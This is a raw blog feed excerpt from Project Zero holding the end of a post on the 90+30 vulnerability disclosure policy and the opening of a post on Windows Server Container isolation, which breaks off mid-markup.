timelines, and we continued to receive feedback from vendors that they were concerned about publicly releasing technical details about vulnerabilities and exploits before most users had installed the patch. In other words, the implied timeline for patch adoption wasn&amp;#39;t clearly understood.&lt;/span&gt;&lt;/p&gt; &lt;p class="c4 c21"&gt;&lt;span class="c2 c1"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c2 c1"&gt;The goal of our 2021 policy update is to make the patch adoption timeline an explicit part of our vulnerability disclosure policy. Vendors will now have 90 days for patch development, and an additional 30 days for patch adoption. &lt;/span&gt;&lt;/p&gt; &lt;p class="c4 c21"&gt;&lt;span class="c2 c1"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c1"&gt;This 90+30 policy gives vendors more time than our current policy, as jumping straight to a 60+30 policy (or similar) would likely be too abrupt and disruptive. &lt;/span&gt;&lt;span class="c2 c1"&gt;Our preference is to choose a starting point that can be consistently met by most vendors, and then gradually lower both patch development and patch adoption timelines. &lt;/span&gt;&lt;/p&gt; &lt;p class="c4 c21"&gt;&lt;span class="c2 c1"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c1"&gt;For example, &lt;/span&gt;&lt;span class="c1 c6"&gt;based on our current data tracking vulnerability patch times, it&amp;#39;s likely that we can move to a &amp;quot;84+28&amp;quot; model for 2022 (having deadlines evenly divisible by 7 significantly reduces the chance our deadlines fall on a weekend). Beyond that, we will keep a close eye on the data and continue to encourage innovation and investment in bug triage, patch development, testing, and update infrastructure.&lt;/span&gt;&lt;/p&gt;&lt;h1 class="c12" id="h.7k96fsib2myi"&gt;&lt;span class="c29"&gt;Risk and benefits&lt;/span&gt;&lt;/h1&gt; &lt;p class="c4 c21"&gt;&lt;span class="c2 c1"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c2 c1"&gt;Much of the debate around vulnerability disclosure is caught up on the issue of whether rapidly releasing technical details benefits attackers or defenders more. From our time in the defensive community, we&amp;#39;ve seen firsthand how the open and timely sharing of technical details helps protect users across the Internet. But we also have listened to the concerns from others around the much more visible &amp;quot;opportunistic&amp;quot; attacks that may come from quickly releasing technical details.&lt;/span&gt;&lt;/p&gt; &lt;p class="c4 c21"&gt;&lt;span class="c2 c1"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c2 c1"&gt;We continue to believe that the benefits to the defensive community of Project Zero&amp;#39;s publications outweigh the risks of disclosure, but we&amp;#39;re willing to incorporate feedback into our policy in the interests of getting the best possible results for user security. Security researchers need to be able to work closely with vendors and open source projects on a range of technical, process, and policy issues -- and heated discussions about the risk and benefits of technical vulnerability details or proof-of-concept exploits has been a significant roadblock.&lt;/span&gt;&lt;/p&gt; &lt;p class="c4 c21"&gt;&lt;span class="c2 c1"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c1"&gt;While the 90+30 policy will be a slight regression from the perspective of rapidly releasing technical details, we&amp;#39;re also signaling our intent to shorten our 90-day disclosure deadline in the near future. &lt;/span&gt;&lt;span class="c1 c6"&gt;We anticipate slowly reducing time-to-patch and speeding up&lt;/span&gt;&lt;span class="c1 c6"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c0"&gt;patch adoption over the coming years until a steady state is reached.&lt;/span&gt;&lt;/p&gt; &lt;p class="c4 c21"&gt;&lt;span class="c0"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c1 c6"&gt;Finally, we understand that this change will make it more difficult for the defensive community to quickly &lt;/span&gt;&lt;span class="c1"&gt;perform their own risk assessment&lt;/span&gt;&lt;span class="c1 c6"&gt;, &lt;/span&gt;&lt;span class="c1"&gt;prioritize patch deployment, test patch efficacy, quickly find variants, &lt;/span&gt;&lt;span class="c1 c6"&gt;deploy available mitigations, and develop detection signatures. We&amp;#39;re always interested in hearing about Project Zero&amp;#39;s publications being used for defensive purposes, and we encourage users to ask their vendors/suppliers for actionable technical details to be shared in security advisories.&lt;/span&gt;&lt;/p&gt;&lt;h1 class="c12" id="h.rkyqqujo2wty"&gt;&lt;span class="c5"&gt;Conclusion&lt;/span&gt;&lt;/h1&gt; &lt;p class="c4 c21"&gt;&lt;span class="c2 c1"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c1 c6"&gt;Moving to a &amp;quot;90+30&amp;quot; model allows us to decouple time to patch from patch adoption time, reduce&lt;/span&gt;&lt;span class="c1 c6"&gt;&amp;nbsp;the contentious debate around attacker/defender trade-offs &lt;/span&gt;&lt;span class="c0"&gt;and the sharing of technical details, while advocating to reduce the amount of time that end users are vulnerable to known attacks.&lt;/span&gt;&lt;/p&gt; &lt;p class="c4 c21"&gt;&lt;span class="c0"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c1 c6"&gt;Disclosure policy is a complex topic with many &lt;/span&gt;&lt;span class="c1 c6"&gt;trade-offs&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;to be made, and this wasn&amp;#39;t an easy decision to make. We are optimistic that our 2021 policy and disclosure trial lays a good foundation for the future, and has a balance of incentives that will lead to positive improvements to user security.&lt;/span&gt;&lt;/p&gt; &lt;p class="c4 c21"&gt;&lt;span class="c2 c22"&gt;&lt;/span&gt;&lt;/p&gt;</content>
    <link rel="replies" type="application/atom+xml" href="https://googleprojectzero.blogspot.com/feeds/8627741980922328390/comments/default" title="Post Comments" />
    <link rel="replies" type="text/html" href="https://googleprojectzero.blogspot.com/2021/04/policy-and-disclosure-2021-edition.html#comment-form" title="0 Comments" />
    <link rel="edit" type="application/atom+xml" href="https://www.blogger.com/feeds/4838136820032157985/posts/default/8627741980922328390" />
    <link rel="self" type="application/atom+xml" href="https://www.blogger.com/feeds/4838136820032157985/posts/default/8627741980922328390" />
    <link rel="alternate" type="text/html" href="https://googleprojectzero.blogspot.com/2021/04/policy-and-disclosure-2021-edition.html" title="Policy and Disclosure: 2021 Edition" />
    <author>
      <name>Ryan</name>
      <uri>http://www.blogger.com/profile/17011901605865574886</uri>
      <email>noreply@blogger.com</email>
      <gd:image rel="http://schemas.google.com/g/2005#thumbnail" width="16" height="16" src="https://img1.blogblog.com/img/b16-rounded.gif" />
    </author>
    <thr:total>0</thr:total>
  </entry>
  <entry>
    <id>tag:blogger.com,1999:blog-4838136820032157985.post-1279312763048126065</id>
    <published>2021-04-01T09:06:00.000-07:00</published>
    <updated>2021-04-01T09:06:01.024-07:00</updated>
    <title type="text">Who Contains the Containers?</title>
    <content type="html">&lt;style type="text/css"&gt;ol.lst-kix_skzdkacf7dv6-0.start{counter-reset:lst-ctn-kix_skzdkacf7dv6-0 0}.lst-kix_skzdkacf7dv6-0&gt;li{counter-increment:lst-ctn-kix_skzdkacf7dv6-0}ol.lst-kix_upj84fi5ja9o-7.start{counter-reset:lst-ctn-kix_upj84fi5ja9o-7 0}ol.lst-kix_xgd2a7n379wd-3.start{counter-reset:lst-ctn-kix_xgd2a7n379wd-3 0}ol.lst-kix_skzdkacf7dv6-3.start{counter-reset:lst-ctn-kix_skzdkacf7dv6-3 0}ol.lst-kix_xgd2a7n379wd-6.start{counter-reset:lst-ctn-kix_xgd2a7n379wd-6 0}.lst-kix_upj84fi5ja9o-0&gt;li:before{content:"" counter(lst-ctn-kix_upj84fi5ja9o-0,decimal) ". "}.lst-kix_upj84fi5ja9o-3&gt;li:before{content:"" counter(lst-ctn-kix_upj84fi5ja9o-3,decimal) ". "}.lst-kix_skzdkacf7dv6-1&gt;li{counter-increment:lst-ctn-kix_skzdkacf7dv6-1}.lst-kix_upj84fi5ja9o-2&gt;li:before{content:"" counter(lst-ctn-kix_upj84fi5ja9o-2,lower-roman) ". "}.lst-kix_upj84fi5ja9o-1&gt;li:before{content:"" counter(lst-ctn-kix_upj84fi5ja9o-1,lower-latin) ". "}ol.lst-kix_upj84fi5ja9o-4.start{counter-reset:lst-ctn-kix_upj84fi5ja9o-4 0}.lst-kix_upj84fi5ja9o-7&gt;li:before{content:"" counter(lst-ctn-kix_upj84fi5ja9o-7,lower-latin) ". "}.lst-kix_upj84fi5ja9o-6&gt;li:before{content:"" counter(lst-ctn-kix_upj84fi5ja9o-6,decimal) ". "}.lst-kix_upj84fi5ja9o-8&gt;li:before{content:"" counter(lst-ctn-kix_upj84fi5ja9o-8,lower-roman) ". "}.lst-kix_upj84fi5ja9o-4&gt;li:before{content:"" counter(lst-ctn-kix_upj84fi5ja9o-4,lower-latin) ". "}.lst-kix_upj84fi5ja9o-5&gt;li:before{content:"" counter(lst-ctn-kix_upj84fi5ja9o-5,lower-roman) ". "}ol.lst-kix_xgd2a7n379wd-8{list-style-type:none}.lst-kix_skzdkacf7dv6-7&gt;li:before{content:"" counter(lst-ctn-kix_skzdkacf7dv6-7,lower-latin) ". "}.lst-kix_skzdkacf7dv6-6&gt;li:before{content:"" counter(lst-ctn-kix_skzdkacf7dv6-6,decimal) ". "}.lst-kix_skzdkacf7dv6-5&gt;li:before{content:"" counter(lst-ctn-kix_skzdkacf7dv6-5,lower-roman) ". "}ol.lst-kix_xgd2a7n379wd-0{list-style-type:none}.lst-kix_upj84fi5ja9o-0&gt;li{counter-increment:lst-ctn-kix_upj84fi5ja9o-0}ol.lst-kix_xgd2a7n379wd-1{list-style-type:none}.lst-kix_xgd2a7n379wd-1&gt;li{counter-increment:lst-ctn-kix_xgd2a7n379wd-1}ol.lst-kix_xgd2a7n379wd-2{list-style-type:none}ol.lst-kix_xgd2a7n379wd-3{list-style-type:none}ol.lst-kix_xgd2a7n379wd-4{list-style-type:none}ol.lst-kix_xgd2a7n379wd-5{list-style-type:none}.lst-kix_skzdkacf7dv6-4&gt;li:before{content:"" counter(lst-ctn-kix_skzdkacf7dv6-4,lower-latin) ". "}ol.lst-kix_xgd2a7n379wd-6{list-style-type:none}ol.lst-kix_xgd2a7n379wd-7{list-style-type:none}.lst-kix_skzdkacf7dv6-1&gt;li:before{content:"" counter(lst-ctn-kix_skzdkacf7dv6-1,lower-latin) ". "}.lst-kix_skzdkacf7dv6-2&gt;li:before{content:"" counter(lst-ctn-kix_skzdkacf7dv6-2,lower-roman) ". "}.lst-kix_xgd2a7n379wd-7&gt;li{counter-increment:lst-ctn-kix_xgd2a7n379wd-7}ol.lst-kix_xgd2a7n379wd-8.start{counter-reset:lst-ctn-kix_xgd2a7n379wd-8 0}.lst-kix_upj84fi5ja9o-2&gt;li{counter-increment:lst-ctn-kix_upj84fi5ja9o-2}.lst-kix_skzdkacf7dv6-3&gt;li:before{content:"" counter(lst-ctn-kix_skzdkacf7dv6-3,decimal) ". "}ol.lst-kix_upj84fi5ja9o-2.start{counter-reset:lst-ctn-kix_upj84fi5ja9o-2 0}.lst-kix_skzdkacf7dv6-0&gt;li:before{content:"" counter(lst-ctn-kix_skzdkacf7dv6-0,decimal) ". "}ol.lst-kix_skzdkacf7dv6-8.start{counter-reset:lst-ctn-kix_skzdkacf7dv6-8 0}ol.lst-kix_xgd2a7n379wd-1.start{counter-reset:lst-ctn-kix_xgd2a7n379wd-1 0}.lst-kix_upj84fi5ja9o-8&gt;li{counter-increment:lst-ctn-kix_upj84fi5ja9o-8}.lst-kix_xgd2a7n379wd-6&gt;li{counter-increment:lst-ctn-kix_xgd2a7n379wd-6}.lst-kix_xgd2a7n379wd-0&gt;li{counter-increment:lst-ctn-kix_xgd2a7n379wd-0}ol.lst-kix_xgd2a7n379wd-7.start{counter-reset:lst-ctn-kix_xgd2a7n379wd-7 0}ol.lst-kix_upj84fi5ja9o-1.start{counter-reset:lst-ctn-kix_upj84fi5ja9o-1 0}.lst-kix_skzdkacf7dv6-4&gt;li{counter-increment:lst-ctn-kix_skzdkacf7dv6-4}.lst-kix_skzdkacf7dv6-7&gt;li{counter-increment:lst-ctn-kix_skzdkacf7dv6-7}ol.lst-kix_xgd2a7n379wd-0.start{counter-reset:lst-ctn-kix_xgd2a7n379wd-0 0}ol.lst-kix_skzdkacf7dv6-2.start{counter-reset:lst-ctn-kix_skzdkacf7dv6-2 0}ol.lst-kix_upj84fi5ja9o-8.start{counter-reset:lst-ctn-kix_upj84fi5ja9o-8 0}ol.lst-kix_upj84fi5ja9o-0{list-style-type:none}ol.lst-kix_upj84fi5ja9o-0.start{counter-reset:lst-ctn-kix_upj84fi5ja9o-0 0}ol.lst-kix_upj84fi5ja9o-2{list-style-type:none}ol.lst-kix_upj84fi5ja9o-1{list-style-type:none}.lst-kix_upj84fi5ja9o-5&gt;li{counter-increment:lst-ctn-kix_upj84fi5ja9o-5}.lst-kix_xgd2a7n379wd-4&gt;li{counter-increment:lst-ctn-kix_xgd2a7n379wd-4}.lst-kix_skzdkacf7dv6-5&gt;li{counter-increment:lst-ctn-kix_skzdkacf7dv6-5}ol.lst-kix_upj84fi5ja9o-8{list-style-type:none}ol.lst-kix_upj84fi5ja9o-7{list-style-type:none}.lst-kix_xgd2a7n379wd-3&gt;li{counter-increment:lst-ctn-kix_xgd2a7n379wd-3}ol.lst-kix_upj84fi5ja9o-4{list-style-type:none}ol.lst-kix_upj84fi5ja9o-3{list-style-type:none}ol.lst-kix_upj84fi5ja9o-6{list-style-type:none}ol.lst-kix_upj84fi5ja9o-5{list-style-type:none}ol.lst-kix_upj84fi5ja9o-6.start{counter-reset:lst-ctn-kix_upj84fi5ja9o-6 0}ol.lst-kix_skzdkacf7dv6-3{list-style-type:none}ol.lst-kix_skzdkacf7dv6-4{list-style-type:none}ol.lst-kix_skzdkacf7dv6-5{list-style-type:none}ol.lst-kix_skzdkacf7dv6-6{list-style-type:none}ol.lst-kix_skzdkacf7dv6-0{list-style-type:none}ol.lst-kix_xgd2a7n379wd-2.start{counter-reset:lst-ctn-kix_xgd2a7n379wd-2 0}.lst-kix_upj84fi5ja9o-6&gt;li{counter-increment:lst-ctn-kix_upj84fi5ja9o-6}ol.lst-kix_skzdkacf7dv6-1{list-style-type:none}ol.lst-kix_skzdkacf7dv6-2{list-style-type:none}ol.lst-kix_skzdkacf7dv6-4.start{counter-reset:lst-ctn-kix_skzdkacf7dv6-4 0}ol.lst-kix_skzdkacf7dv6-1.start{counter-reset:lst-ctn-kix_skzdkacf7dv6-1 0}ol.lst-kix_skzdkacf7dv6-7{list-style-type:none}ol.lst-kix_skzdkacf7dv6-8{list-style-type:none}ol.lst-kix_upj84fi5ja9o-3.start{counter-reset:lst-ctn-kix_upj84fi5ja9o-3 0}.lst-kix_upj84fi5ja9o-3&gt;li{counter-increment:lst-ctn-kix_upj84fi5ja9o-3}.lst-kix_skzdkacf7dv6-6&gt;li{counter-increment:lst-ctn-kix_skzdkacf7dv6-6}.lst-kix_skzdkacf7dv6-3&gt;li{counter-increment:lst-ctn-kix_skzdkacf7dv6-3}ol.lst-kix_xgd2a7n379wd-5.start{counter-reset:lst-ctn-kix_xgd2a7n379wd-5 0}ol.lst-kix_skzdkacf7dv6-7.start{counter-reset:lst-ctn-kix_skzdkacf7dv6-7 0}.lst-kix_xgd2a7n379wd-7&gt;li:before{content:"" counter(lst-ctn-kix_xgd2a7n379wd-7,lower-latin) ". "}.lst-kix_xgd2a7n379wd-5&gt;li:before{content:"" counter(lst-ctn-kix_xgd2a7n379wd-5,lower-roman) ". "}.lst-kix_xgd2a7n379wd-6&gt;li:before{content:"" counter(lst-ctn-kix_xgd2a7n379wd-6,decimal) ". "}ol.lst-kix_upj84fi5ja9o-5.start{counter-reset:lst-ctn-kix_upj84fi5ja9o-5 0}.lst-kix_xgd2a7n379wd-3&gt;li:before{content:"" counter(lst-ctn-kix_xgd2a7n379wd-3,decimal) ". "}ol.lst-kix_skzdkacf7dv6-5.start{counter-reset:lst-ctn-kix_skzdkacf7dv6-5 0}.lst-kix_skzdkacf7dv6-8&gt;li:before{content:"" counter(lst-ctn-kix_skzdkacf7dv6-8,lower-roman) ". "}.lst-kix_xgd2a7n379wd-4&gt;li:before{content:"" counter(lst-ctn-kix_xgd2a7n379wd-4,lower-latin) ". "}.lst-kix_xgd2a7n379wd-2&gt;li{counter-increment:lst-ctn-kix_xgd2a7n379wd-2}.lst-kix_skzdkacf7dv6-2&gt;li{counter-increment:lst-ctn-kix_skzdkacf7dv6-2}.lst-kix_skzdkacf7dv6-8&gt;li{counter-increment:lst-ctn-kix_skzdkacf7dv6-8}.lst-kix_xgd2a7n379wd-1&gt;li:before{content:"" counter(lst-ctn-kix_xgd2a7n379wd-1,lower-latin) ". "}.lst-kix_upj84fi5ja9o-1&gt;li{counter-increment:lst-ctn-kix_upj84fi5ja9o-1}.lst-kix_xgd2a7n379wd-2&gt;li:before{content:"" counter(lst-ctn-kix_xgd2a7n379wd-2,lower-roman) ". "}.lst-kix_xgd2a7n379wd-0&gt;li:before{content:"" counter(lst-ctn-kix_xgd2a7n379wd-0,decimal) ". "}ol.lst-kix_skzdkacf7dv6-6.start{counter-reset:lst-ctn-kix_skzdkacf7dv6-6 0}ol.lst-kix_xgd2a7n379wd-4.start{counter-reset:lst-ctn-kix_xgd2a7n379wd-4 0}li.li-bullet-0:before{margin-left:-18pt;white-space:nowrap;display:inline-block;min-width:18pt}.lst-kix_upj84fi5ja9o-4&gt;li{counter-increment:lst-ctn-kix_upj84fi5ja9o-4}.lst-kix_upj84fi5ja9o-7&gt;li{counter-increment:lst-ctn-kix_upj84fi5ja9o-7}.lst-kix_xgd2a7n379wd-5&gt;li{counter-increment:lst-ctn-kix_xgd2a7n379wd-5}.lst-kix_xgd2a7n379wd-8&gt;li{counter-increment:lst-ctn-kix_xgd2a7n379wd-8}.lst-kix_xgd2a7n379wd-8&gt;li:before{content:"" counter(lst-ctn-kix_xgd2a7n379wd-8,lower-roman) ". "}ol{margin:0;padding:0}table td,table th{padding:0}.c24{border-right-style:solid;padding:5pt 5pt 5pt 5pt;border-bottom-color:#000000;border-top-width:1pt;border-right-width:1pt;border-left-color:#000000;vertical-align:top;border-right-color:#000000;border-left-width:1pt;border-top-style:solid;border-left-style:solid;border-bottom-width:1pt;width:468pt;border-top-color:#000000;border-bottom-style:solid}.c5{background-color:#ffffff;color:#000000;font-weight:400;text-decoration:none;vertical-align:baseline;font-size:10pt;font-family:"Courier New";font-style:normal}.c11{color:#000000;font-weight:400;text-decoration:none;vertical-align:baseline;font-size:11pt;font-family:"Arial";font-style:normal}.c12{padding-top:18pt;padding-bottom:6pt;line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}.c1{color:#000000;font-weight:400;text-decoration:none;vertical-align:baseline;font-size:11pt;font-family:"Courier New";font-style:normal}.c40{color:#000000;font-weight:400;text-decoration:none;vertical-align:baseline;font-size:11pt;font-family:"Arial"}.c3{padding-top:0pt;padding-bottom:0pt;line-height:1.5;orphans:2;widows:2;text-align:left}.c10{padding-top:0pt;padding-bottom:0pt;line-height:1.500000000000001;orphans:2;widows:2;text-align:left}.c15{color:#006400;text-decoration:none;vertical-align:baseline;font-size:10pt;font-style:normal}.c7{padding-top:0pt;padding-bottom:0pt;line-height:1.0;text-align:left}.c22{color:#000000;text-decoration:none;vertical-align:baseline;font-style:normal}.c27{color:#8b0000;text-decoration:none;vertical-align:baseline;font-style:normal}.c0{font-size:10pt;font-family:"Courier New";color:#0000ff;font-weight:400}.c13{border-spacing:0;border-collapse:collapse;margin-right:auto}.c23{text-decoration-skip-ink:none;-webkit-text-decoration-skip:none;color:#1155cc;text-decoration:underline}.c6{font-size:10pt;font-family:"Courier New";color:#8a2be2;font-weight:400}.c34{font-weight:400;font-size:16pt;font-family:"Arial"}.c30{font-weight:700;font-size:11pt;font-family:"Courier New"}.c19{background-color:#ffffff;max-width:468pt;padding:72pt 72pt 72pt 72pt}.c33{text-decoration:none;vertical-align:baseline;font-style:normal}.c18{font-family:"Courier New";color:#000080;font-weight:700}.c21{font-family:"Courier New";color:#0000ff;font-weight:700}.c8{font-weight:400;font-family:"Courier New"}.c41{background-color:#ffffff;font-size:11.5pt}.c38{padding:0;margin:0}.c25{margin-left:36pt;padding-left:0pt}.c16{font-size:10pt;color:#696969}.c31{color:inherit;text-decoration:inherit}.c14{background-color:#ffffff;font-size:10pt}.c28{color:#006161}.c17{font-size:10pt}.c26{color:#800080}.c43{color:#008000}.c32{color:#000080}.c9{height:0pt}.c36{color:#8b0000}.c20{color:#a82d00}.c2{font-style:italic}.c37{color:#0000ff}.c35{font-weight:700}.c29{color:#006400}.c39{color:#ff8000}.c42{font-size:12pt}.c4{height:11pt}.title{padding-top:0pt;color:#000000;font-size:26pt;padding-bottom:3pt;font-family:"Arial";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}.subtitle{padding-top:0pt;color:#666666;font-size:15pt;padding-bottom:16pt;font-family:"Arial";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}li{color:#000000;font-size:11pt;font-family:"Arial"}p{margin:0;color:#000000;font-size:11pt;font-family:"Arial"}h1{padding-top:20pt;color:#000000;font-size:20pt;padding-bottom:6pt;font-family:"Arial";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}h2{padding-top:18pt;color:#000000;font-size:16pt;padding-bottom:6pt;font-family:"Arial";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}h3{padding-top:16pt;color:#434343;font-size:14pt;padding-bottom:4pt;font-family:"Arial";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}h4{padding-top:14pt;color:#666666;font-size:12pt;padding-bottom:4pt;font-family:"Arial";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}h5{padding-top:12pt;color:#666666;font-size:11pt;padding-bottom:4pt;font-family:"Arial";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}h6{padding-top:12pt;color:#666666;font-size:11pt;padding-bottom:4pt;font-family:"Arial";line-height:1.5;page-break-after:avoid;font-style:italic;orphans:2;widows:2;text-align:left}&lt;/style&gt;&lt;/head&gt;&lt;body class="c19"&gt; &lt;p class="c3"&gt;&lt;span class="c11"&gt;Posted by James Forshaw, Project Zero&lt;/span&gt;&lt;/p&gt; &lt;p class="c3 c4"&gt;&lt;span class="c11"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span&gt;This is a &lt;/span&gt;&lt;span&gt;short blog post&lt;/span&gt;&lt;span class="c11"&gt;&amp;nbsp;about a research project I conducted on Windows Server Containers that resulted in four privilege escalations which Microsoft fixed in March 2021. In the post, I describe what led to this research, my research process, and insights into what to look for if you&amp;rsquo;re researching this area.&lt;/span&gt;&lt;/p&gt;&lt;h2 class="c12" id="h.nq1xwb8173m"&gt;&lt;span class="c22 c34"&gt;Windows Containers Background&lt;/span&gt;&lt;/h2&gt; &lt;p class="c3"&gt;&lt;span&gt;Windows 10 and its server counterparts added support for application containerization. The implementation in Windows is similar in concept to Linux containers, but of course wildly different. The well-known Docker platform supports Windows containers which leads to the availability of related projects such as Kubernetes running on Windows. You can read a bit of background on Windows containers on &lt;/span&gt;&lt;span class="c23"&gt;&lt;a class="c311" href="https://docs.microsoft.com/en-us/virtualization/windowscontainers/about/"&gt;MSDN&lt;/a&gt;&lt;/span&gt;&lt;span class="c11"&gt;. I&amp;rsquo;m not going to go in any depth on how containers work in Linux as very little is applicable to Windows.&lt;/span&gt;&lt;/p&gt; &lt;p class="c3 c4"&gt;&lt;span class="c11"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span&gt;The primary goal of a container is to hide the real OS from an application. For example, in Docker you can download a standard container image which contains a completely separate copy of Windows. The image is used to build the container which uses a feature of the Windows kernel called a &lt;/span&gt;&lt;span class="c2"&gt;Server Silo&lt;/span&gt;&lt;span&gt;&amp;nbsp;allowing for redirection of resources such as the object manager, registry and networking. The server silo is a special type of &lt;/span&gt;&lt;span class="c23"&gt;&lt;a class="c311" href="https://docs.microsoft.com/en-us/windows/win32/procthread/job-objects"&gt;Job object&lt;/a&gt;&lt;/span&gt;&lt;span class="c11"&gt;, which can be assigned to a process. &lt;/span&gt;&lt;/p&gt; &lt;p class="c3 c4"&gt;&lt;span class="c11"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;/p&gt; &lt;p class="c3 c4"&gt;&lt;span class="c11"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c11"&gt;&lt;a href="https://1.bp.blogspot.com/-mKtn-agfB2M/YFTt-NApHyI/AAAAAAAAaxo/i50NObex2No87aTpiQ_nib9XQa_9wkFewCNcBGAsYHQ/s759/image1%2B%25283%2529.png" style="display: block; padding: 1em 0;text-align: center;"&gt;&lt;img src="https://1.bp.blogspot.com/-mKtn-agfB2M/YFTt-NApHyI/AAAAAAAAaxo/i50NObex2No87aTpiQ_nib9XQa_9wkFewCNcBGAsYHQ/s600/image1%2B%25283%2529.png" border="0" alt="Diagram of a server silo. Shows an application interacting with the registry, object manager and network and how being in the silo redirects that access to another location." style="max-height: 750; max-width: 600;" /&gt;&lt;/a&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c3 c4"&gt;&lt;span class="c11"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c11"&gt;The application running in the container, as far as possible, will believe it&amp;rsquo;s running in its own unique OS instance. Any changes it makes to the system will only affect the container and not the real OS which is hosting it. This allows an administrator to bring up new instances of the application easily as any system or OS differences can be hidden. &lt;/span&gt;&lt;/p&gt; &lt;p class="c3 c4"&gt;&lt;span class="c11"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span&gt;For example the container could be moved between different Windows systems, or even to a Linux system with the appropriate virtualization and the application shouldn&amp;rsquo;t be able to tell the difference. Containers shouldn&amp;rsquo;t be confused with virtualization however, which &lt;/span&gt;&lt;span&gt;provides a consistent hardware interface to the OS.&lt;/span&gt;&lt;span class="c11"&gt;&amp;nbsp;A container is more about providing a consistent OS interface to applications.&lt;/span&gt;&lt;/p&gt; &lt;p class="c3 c4"&gt;&lt;span class="c11"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c11"&gt;Realistically, containers are mainly about using their isolation primitives for hiding the real OS and providing a consistent configuration in which an application can execute. However, there&amp;rsquo;s also some potential security benefit to running inside a container, as the application shouldn&amp;rsquo;t be able to directly interact with other processes and resources on the host.&lt;/span&gt;&lt;/p&gt; &lt;p class="c3 c4"&gt;&lt;span class="c11"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span&gt;There are two supported types of containers: Windows Server Containers and &lt;/span&gt;&lt;span class="c41"&gt;Hyper-V Isolated Containers&lt;/span&gt;&lt;span class="c11"&gt;. Windows Server Containers run under the current kernel as separate processes inside a server silo. Therefore a single kernel vulnerability would allow you to escape the container and access the host system.&lt;/span&gt;&lt;/p&gt; &lt;p class="c3 c4"&gt;&lt;span class="c11"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span&gt;Hyper-V Isolated Containers still run in a server silo, but do so in a separate lightweight VM. You can still use the same kernel vulnerability to escape the server silo, but you&amp;rsquo;re still constrained by the VM and hypervisor. &lt;/span&gt;&lt;span&gt;To fully escape and access the host you&amp;rsquo;d need a separate VM escape as well.&lt;/span&gt;&lt;/p&gt; &lt;p class="c3 c4"&gt;&lt;span class="c11"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span&gt;&lt;a href="https://1.bp.blogspot.com/--sV6vWTF71Y/YFTt_bAuKaI/AAAAAAAAaxs/sSIYUpz8CHQ-tXh2OsNq6p9jLwiKXEXeACNcBGAsYHQ/s608/image2%2B%25282%2529.png" style="display: block; padding: 1em 0;text-align: center;"&gt;&lt;img src="https://1.bp.blogspot.com/--sV6vWTF71Y/YFTt_bAuKaI/AAAAAAAAaxs/sSIYUpz8CHQ-tXh2OsNq6p9jLwiKXEXeACNcBGAsYHQ/s600/image2%2B%25282%2529.png" border="0" alt="Diagram comparing Windows Server Containers and Hyper-V Isolated Containers. The server container on the left directly accesses the hosts kernel. For Hyper-V the container accesses a virtualized kernel, which dispatches to the hypervisor and then back to the original host kernel. This shows the additional security boundary in place to make Hyper-V isolated containers more secure." style="max-height: 750; max-width: 600;" /&gt;&lt;/a&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c3 c4"&gt;&lt;span class="c11"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span&gt;The current &lt;/span&gt;&lt;span class="c23"&gt;&lt;a class="c311" href="https://www.microsoft.com/en-us/msrc/windows-security-servicing-criteria"&gt;MSRC security servicing criteria&lt;/a&gt;&lt;/span&gt;&lt;span class="c11"&gt;&amp;nbsp;states that Windows Server Containers are not a security boundary as you still have direct access to the kernel. However, if you use Hyper-V isolation, a silo escape wouldn&amp;rsquo;t compromise the host OS directly as the security boundary is at the hypervisor level. That said, escaping the server silo is likely to be the first step in attacking Hyper-V containers meaning an escape is still useful as part of a chain.&lt;/span&gt;&lt;/p&gt; &lt;p class="c3 c4"&gt;&lt;span class="c11"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c11"&gt;As Windows Server Containers are not a security boundary any bugs in the feature won&amp;rsquo;t result in a security bulletin being issued. Any issues might be fixed in the next major version of Windows, but they might not be.&lt;/span&gt;&lt;/p&gt;&lt;h2 class="c12" id="h.p0j52mkkwgkj"&gt;&lt;span class="c22 c34"&gt;Origins of the Research&lt;/span&gt;&lt;/h2&gt; &lt;p class="c3"&gt;&lt;span&gt;Over a year ago I was asked for some advice by &lt;/span&gt;&lt;span class="c23"&gt;&lt;a class="c311" 